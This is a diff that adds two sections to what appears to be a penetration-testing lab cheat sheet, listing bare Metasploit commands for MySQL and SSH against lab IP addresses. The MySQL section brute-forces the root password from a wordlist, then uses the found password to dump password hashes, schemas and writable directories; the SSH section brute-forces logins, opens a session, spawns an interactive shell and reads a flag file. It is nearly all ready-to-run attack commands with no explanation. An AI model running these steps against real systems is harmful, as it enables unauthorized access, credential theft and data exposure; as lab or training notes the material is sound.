@@ -980,7 +980,75 @@ set VERBOSE false
 run
 
 ```
+53)  MySQL Enumeration
+    
+```
+use auxiliary/scanner/mysql/mysql_version
+set RHOSTS 192.76.252.3
+run
+use auxiliary/scanner/mysql/mysql_login
+set RHOSTS 192.76.252.3
+set USERNAME root
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set VERBOSE false
+run
+use auxiliary/admin/mysql/mysql_enum
+set USERNAME root
+set PASSWORD twinkle
+set RHOSTS 192.76.252.3
+run
+use auxiliary/admin/mysql/mysql_sql
+set USERNAME root
+set PASSWORD twinkle
+set RHOSTS 192.76.252.3
+run
+use auxiliary/scanner/mysql/mysql_file_enum
+set USERNAME root
+set PASSWORD twinkle
+set RHOSTS 192.76.252.3
+set FILE_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
+set VERBOSE true
+run
+use auxiliary/scanner/mysql/mysql_hashdump
+set USERNAME root
+set PASSWORD twinkle
+set RHOSTS 192.76.252.3
+run
+use auxiliary/scanner/mysql/mysql_schemadump
+set USERNAME root
+set PASSWORD twinkle
+set RHOSTS 192.76.252.3
+run
+use auxiliary/scanner/mysql/mysql_writable_dirs
+set RHOSTS 192.76.252.3
+set USERNAME root
+set PASSWORD twinkle
+set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
+run
+```
+54)  SSH Login
+    
+```
+nmap -sS -sV 192.245.211.3
+msfconsole
+use auxiliary/scanner/ssh/ssh_version
+set RHOSTS 192.245.211.3
+exploit
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS 192.245.211.3
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
+set STOP_ON_SUCCESS true
+set VERBOSE true
+exploit
+sessions
+sessions -i 1
+/bin/bash -i
+pwd
+cd /
+find / -name "flag"
+cat /flag
 
-
+```
 
 
